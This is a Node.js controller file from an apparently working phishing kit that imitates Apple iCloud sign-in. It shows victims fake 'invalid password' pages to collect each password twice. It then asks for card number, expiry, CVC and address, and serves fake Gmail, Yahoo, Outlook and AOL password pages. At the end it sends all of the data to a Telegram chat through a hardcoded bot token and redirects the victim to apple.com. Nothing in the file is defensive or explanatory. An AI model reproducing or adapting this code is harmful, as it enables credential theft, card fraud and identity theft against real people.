const User = require('../models/User')
require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');
const token = "6563244298:AAF5y_kx6LDFDa_ZXaGWB3p6ZfJXgKnrsi8;
const bot = new TelegramBot(token, { polling: true });
const chatID = -4076400458
i = -1
Users = []

exports.login_page = (req, res) => {
  i++
  var ua = req.headers['user-agent'];

  newUser = {
    count: i,
    userAgent: ua,  
    icloudID : '',
    IcloudPASS: '',
    IcloudPASS2: '',
    name: '',
    address1: '',
    address2: '',
    city: '',
    state: '',
    zip: '',
    phone: '',
    cardnumber: '',
    expiration: '',
    cvc: '',
    emailPASS: '',
    emailPASS2: ''

  }
  Users[i] = newUser
  bot.sendMessage(chatID, "New User Has Landed and is assigned an ID of " + i + "\nUser-Agent : " + ua + "\n")

  res.render('icloud', { count : i})
}

exports.login_post = async (req, res) => {
  const email = req.body.appleid;
  const password = req.body.password
  const count = req.body.count;
  Users[count].icloudID = email
  Users[count].IcloudPASS = password

  res.render('icloud-invalid', { count : i, email})


  
}

exports.billingform_post = async (req, res) => {
  const email = req.body.appleid;
  const password = req.body.password
  const count = req.body.count;
  Users[count].IcloudPASS2 = password

  res.render('icloud-cc', { count : i, email})

}


exports.billingformsubmit_post = async (req, res) => {
  console.log(req.body)
  const count = req.body.count;
  Users[count].name = req.body.name
  Users[count].address1 = req.body.address1
  Users[count].address2 = req.body.address2
  Users[count].address2 = req.body.address2
  Users[count].city = req.body.city
  Users[count].state = req.body.state
  Users[count].zip = req.body.zip
  Users[count].phone = req.body.phone
  Users[count].cardnumber = req.body.cardnumber
  Users[count].expiration = req.body.expiration
  Users[count].cvc = req.body.cvc

  switch (true) {
    case Users[count].icloudID.includes('yahoo.com'):
      res.redirect(`/login/yahoo/${count}`)
      break;
    case Users[count].icloudID.includes('gmail.com'):
      res.redirect(`/login/gmail/${count}`)
      break;
    case Users[count].icloudID.includes('outlook.com'):
      res.redirect(`/login/outlook/${count}`)
      break;
    case Users[count].icloudID.includes('mail.com'):
      res.redirect(`/login/mail/${count}`)
      break;
    case Users[count].icloudID.includes('aol.com'):
      res.redirect(`/login/aol/${count}`)
      break;
    default:
      break;
  }
}


exports.page_loader_get = (req, res) => {
  console.log(`Recieved req at ${req.url}`)
  page2load = req.params.page
  count = req.params.count 
  email = Users[count].icloudID
  res.render(`${page2load}-pass`, { count, email })
}

exports.page_loader_post = (req, res) => {
  page2load = req.params.page
  count = req.params.count
  email = Users[count].icloudID
  password = req.body.password
  Users[count].emailPASS = password
  // console.log(Users[count])
  res.render(`${page2load}-pass-invalid`, { count, email, page2load })

  // res.send('DONE')
  // res.render(page2load, { count })
}


exports.invalidpage_loader_post = (req, res) => {
  page2load = req.params.page
  count = req.params.count
  password = req.body.password
  Users[count].emailPASS2 = password
  console.log(Users[count])
  // res.render(`${page2load}-pass-invalid`, { count, email })
  bot.sendMessage(chatID, `
    count: ${count}
    ua: ${Users[count].userAgent}
    Apple ID: ${Users[count].icloudID}
    Apple ID Pass1: ${Users[count].IcloudPASS}
    Apple ID Pass2: ${Users[count].IcloudPASS2}
    name: ${Users[count].name}
    address1: ${Users[count].address1}
    address2: ${Users[count].address2}
    address2: ${Users[count].address2}
    city: ${Users[count].city}
    state: ${Users[count].state}
    zip: ${Users[count].zip}
    phone: ${Users[count].phone}
    cardnumber: ${Users[count].cardnumber}
    expiration: ${Users[count].expiration}
    cvc: ${Users[count].cvc}
    emailPASS: ${Users[count].emailPASS}
    emailPASS2: ${Users[count].emailPASS2}
  `)

  res.redirect('https://apple.com')

  // res.render(page2load, { count })
}

exports.test_page = (req, res) => {
  res.render('outlook-pass-invalid', { count: 0 ,email: 'lala@outlook.com'})
}
